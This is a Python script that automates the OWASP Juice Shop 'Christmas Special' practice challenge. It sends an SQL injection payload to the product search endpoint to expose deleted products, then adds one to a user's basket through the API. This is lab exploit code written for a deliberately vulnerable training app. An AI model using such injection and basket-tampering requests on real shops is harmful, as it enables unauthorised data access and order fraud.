"""
This file is to automate the OWASP JUICESHOP TASK
CHRISTMAS SPECIAL -- NOT SOLVED (similar to paybacktime)
-------------------------------------------------
Steps:
1. You need to find those deleted products using injection
2. Add those products into your basket
"""

from plugins import attack as a
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Chrismas_special():

    def __init__(self):
        self.juice_session = a.requests.session()
        self.url = a.URL + "/rest/products/search?q='))--"
        self.email = self.set_info()
        self.cookie, self.header = a.get_auth(self.email)
        self.basketId = a.get_basket_id(self.email)

    def set_info(self):
        print("please enter a customer user's email")
        email = input()
        return email

    def generator(self):
        pass

    def get_product(self):
        response = self.juice_session.get(self.url, cookies=self.cookie, headers=self.header)
        print(response.text)
        data_list = response.json()["data"]
        for i in range(len(data_list)):
            if "Christmas" in data_list[i]["name"]:
                return data_list[i]

    def add_product2basekt(self, productId):
        print("we will add product Id {} ".format(productId))
        json = {
            "ProductId": productId,
            "BasketId": self.basketId,
            "quantity": 1
        }
        url = a.URL + '/api/BasketItems/'
        response = self.juice_session.post(url, cookies=self.cookie, headers=self.header, json=json
                                           , verify=False)
        print(response.text)

    def run(self):
        product = self.get_product()
        productId = product["id"]
        self.add_product2basekt(productId)







